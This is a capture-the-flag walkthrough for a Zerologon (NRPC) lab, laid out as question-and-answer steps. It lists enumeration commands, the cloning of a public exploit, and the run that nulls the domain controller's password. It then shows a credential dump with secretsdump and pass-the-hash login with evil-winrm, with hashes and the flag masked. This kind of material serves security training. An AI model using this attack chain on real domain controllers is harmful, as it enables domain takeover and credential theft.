# Zero Logon

- Read about Zero Logon

	  no answer needed

- Install Impacket in a Virtual Environment 

	  no answer needed

- What method will allow us to change Passwords over NRPC?

	- `NetrServerPasswordSet2`

- What are the required fields for the method per the Microsoft Documentation?

	- `PrimaryName, AccountName, SecureChannelType, ComputerName, Authenticator, ReturnAuthenticator, ClearNewPassword`

- What Opnumber is the Method?

	- `30`

- Modify the PoC

	- `git clone https://github.com/Sq00ky/Zero-Logon-Exploit`

- What is the NetBIOS name of the Domain Controller?

	- `nmap -sV -sC -oA scans/initial <TARGET_IP>`
	- `DC01`

- What is the NetBIOS domain name of the network?

	- `HOLOLIVE`

- What domain are you attacking?

	- `hololive.local`

- What is the Local Administrator's NTLM hash?

	- `python3 zerologon-NullPass.py DC01 <TARGET_IP>`
	- `secretsdumps.py -just-dc -no-pass DC01\$@<TARGET_IP>`
	- `Administrator:500:aad3b435b51404eeaad3b435b51404ee:*********************************:::`

- How many Domain Admin accounts are there?

	- `2`

- What is the root flag?

	- `evil-winrm -u Administrator -H ********************************* -i <TARGET_IP>`
	- `cd ..`
	- `cat root.txt`
	- `********************`

